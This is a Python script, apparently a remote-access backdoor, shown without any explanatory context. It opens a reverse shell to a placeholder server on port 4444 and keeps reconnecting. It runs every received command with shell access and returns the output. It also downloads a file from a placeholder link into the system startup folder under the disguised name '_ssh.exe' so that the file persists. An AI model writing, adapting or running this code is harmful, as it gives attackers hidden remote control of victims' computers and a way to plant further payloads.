import socket
import os
import subprocess
import time
import urllib.request
import platform
import logging
import threading

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

s = None
host = "server_ip"
port = 4444
heartbeat_interval = 20
reconnect_interval = 3

def get_startup_directory():
    system = platform.system().lower()
    if system == 'windows':
        return os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    elif system == 'darwin':
        return os.path.expanduser('~/Library/StartupItems')
    else:
        return os.path.expanduser('~/.config/autostart')

def download_file(url, save_path):
    try:
        urllib.request.urlretrieve(url, save_path)
        logging.info(f"File downloaded successfully: {save_path}")
    except Exception as e:
        logging.error(f"Download failed: {e}")

def connect_to_server():
    global s
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

            if platform.system().lower() == "linux":
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 30)  # Start keep-alive after 30 sec
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)  # Send keep-alive every 10 sec
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 5)  # Retry 5 times before dropping

            s.connect((host, port))
            logging.info(f"Connected to server {host}:{port}")
            return
        except Exception as e:
            logging.error(f"Connection failed: {e}. Retrying in {reconnect_interval} seconds...")
            time.sleep(reconnect_interval)

def handle_commands():
    last_command_time = time.time()

    while True:
        try:
            if s.fileno() == -1:
                logging.warning("Socket is no longer valid. Reconnecting...")
                connect_to_server()
                last_command_time = time.time()
                continue

            if time.time() - last_command_time > heartbeat_interval:
                try:
                    s.send(str.encode("heartbeat\n"))
                except socket.error:
                    logging.warning("Heartbeat failed, reconnecting...")
                    connect_to_server()
                last_command_time = time.time()

            data = s.recv(4096)
            if not data:
                logging.warning("Server disconnected. Reconnecting...")
                connect_to_server()
                last_command_time = time.time()
                continue

            command = data.decode("utf-8").strip()
            logging.info(f"Received command: {command}")

            if command.startswith("cd "):
                os.chdir(command[3:])
                last_command_time = time.time()
                continue

            if command:
                cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = output_bytes.decode("utf-8", errors="ignore")
                s.send(str.encode(output_str + "\n" + os.getcwd() + "> "))

                last_command_time = time.time()

        except (socket.error, ConnectionResetError) as e:
            logging.error(f"Socket error: {e}. Reconnecting...")
            connect_to_server()
            last_command_time = time.time()

        except Exception as e:
            logging.error(f"Error occurred: {e}")
            time.sleep(5)

def download_file_to_startup():
    url = 'download_link'
    startup_directory = get_startup_directory()

    if not os.path.exists(startup_directory):
        os.makedirs(startup_directory)

    file_name = '_ssh.exe'
    file_path = os.path.join(startup_directory, file_name)

    download_file(url, file_path)

def main():
    try:
        download_file_to_startup()
        connect_to_server()

        command_thread = threading.Thread(target=handle_commands)
        command_thread.daemon = True
        command_thread.start()

        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        logging.info("Script interrupted. Exiting gracefully.")
    except Exception as e:
        logging.error(f"Critical error occurred: {e}")

if __name__ == "__main__":
    main()
